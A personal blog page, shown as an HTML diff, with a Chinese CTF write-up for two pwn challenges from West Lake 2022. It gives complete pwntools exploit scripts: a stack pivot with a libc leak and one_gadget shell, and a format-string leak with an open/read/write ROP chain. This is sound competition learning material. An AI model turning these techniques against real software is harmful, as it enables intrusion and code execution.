@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="7r1p13J">
+
+
+
+
+
+<title>西湖论剑2022 | Hexo</title>
+
+
+
+    <link rel="icon" href="/github-11-48.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">西湖论剑2022</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 4, 2023&nbsp;&nbsp;10:28:05</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><del>难的难，简单的简单，而且5题只有8小时……不好评价</del></p>
+<p><del>起床已经是要下午了，所以我基本就只做了两题+看了看jit</del></p>
+<h2 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h2><p>无栈溢出，但是i一次可控，只能写一字节，若修改返回地址为main之类的再次循环，依旧无法有效再次写</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20230202163802042.png" alt="image-20230202163802042"></p>
+<p>运行多次发现rbp指向随机，且有可能指向我们可控的地址</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20230202164111801.png" alt="image-20230202164111801"></p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20230202164135863.png" alt="image-20230202164135863"></p>
+<p>故考虑栈迁移，在上面布置一次leak的链，泄露libc之后ret回main，再一次栈迁移直接打onegadget</p>
+<p>一共两次栈迁移，且都随机，所以大概率要打多次</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;tcp.cloud.dasctf.com&#x27;,26623)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400800&#x27;)</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x400BB7&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/pwnme/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mysend</span>(<span class="params">x,i</span>):</span><br><span class="line">    payload=<span class="built_in">str</span>(x&amp;<span class="number">0xff</span>).encode()</span><br><span class="line">    payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p8(<span class="number">19</span>)+p8(<span class="number">36</span>)+p8(<span class="number">53</span>)+p8(<span class="number">70</span>)+p8(<span class="number">55</span>)+p8(<span class="number">66</span>)+p8(<span class="number">17</span>)+p8(<span class="number">161</span>)+p8(<span class="number">50</span>)+p8(<span class="number">131</span>)+p8(<span class="number">212</span>)+p8(<span class="number">101</span>)+p8(<span class="number">118</span>)+p8(<span class="number">199</span>)+p8(<span class="number">24</span>)+p8(<span class="number">3</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1c</span>+p32(<span class="number">0x38</span>+i)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400ca3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400ca1</span></span><br><span class="line">ret=<span class="number">0x00000000004005b9</span></span><br><span class="line">ret_addr=<span class="number">0x400c1b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#13 20 </span></span><br><span class="line">leak=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">payload=<span class="string">b&#x27;24&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=leak*<span class="number">6</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p8(<span class="number">19</span>)+p8(<span class="number">36</span>)+p8(<span class="number">53</span>)+p8(<span class="number">70</span>)+p8(<span class="number">55</span>)+p8(<span class="number">66</span>)+p8(<span class="number">17</span>)+p8(<span class="number">161</span>)+p8(<span class="number">50</span>)+p8(<span class="number">131</span>)+p8(<span class="number">212</span>)+p8(<span class="number">101</span>)+p8(<span class="number">118</span>)+p8(<span class="number">199</span>)+p8(<span class="number">24</span>)+p8(<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1c</span>+p32(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"><span class="comment">#puts_addr=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;24&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p8(<span class="number">19</span>)+p8(<span class="number">36</span>)+p8(<span class="number">53</span>)+p8(<span class="number">70</span>)+p8(<span class="number">55</span>)+p8(<span class="number">66</span>)+p8(<span class="number">17</span>)+p8(<span class="number">161</span>)+p8(<span class="number">50</span>)+p8(<span class="number">131</span>)+p8(<span class="number">212</span>)+p8(<span class="number">101</span>)+p8(<span class="number">118</span>)+p8(<span class="number">199</span>)+p8(<span class="number">24</span>)+p8(<span class="number">3</span>)</span><br><span class="line">payload+= p64(onegadget)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x4</span>+p32(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mysend(puts_got&amp;0xff,8)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="message-board"><a href="#message-board" class="headerlink" title="message board"></a>message board</h2><p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20230202164427318.png" alt="image-20230202164427318"></p>
+<p>保护基本没开，开起了沙箱orw</p>
+<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20230202164511582.png" alt="image-20230202164511582"></p>
+<p>存在格串和栈溢出</p>
+<p>用格串leak栈地址和libc，用一点点的栈溢出迁移到栈上完成rop即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="number">20477</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%31$p%p&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x27083</span>+<span class="number">0x3000</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0xc0</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">buf=stack-<span class="number">0xb0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rsp=libc_base+<span class="number">0x000000000002f70a</span></span><br><span class="line">leave=<span class="number">0x4013a2</span></span><br><span class="line">ret=<span class="number">0x4013a3</span></span><br><span class="line">flag_addr=buf+<span class="number">0xa8</span></span><br><span class="line"></span><br><span class="line">payload=p64(ret)+p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi)+p64(buf)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=payload.ljust(<span class="number">0xa8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload+=p64(buf-<span class="number">8</span>)</span><br><span class="line">payload+=p64(leave)</span><br><span class="line"><span class="comment">#0x7ffd6fe45490</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>7r1p13J</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2023/02/10/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/">《软件分析》课程笔记</a>
+            
+            
+            <a class="next" rel="next" href="/2023/01/19/cs144/">CS144</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
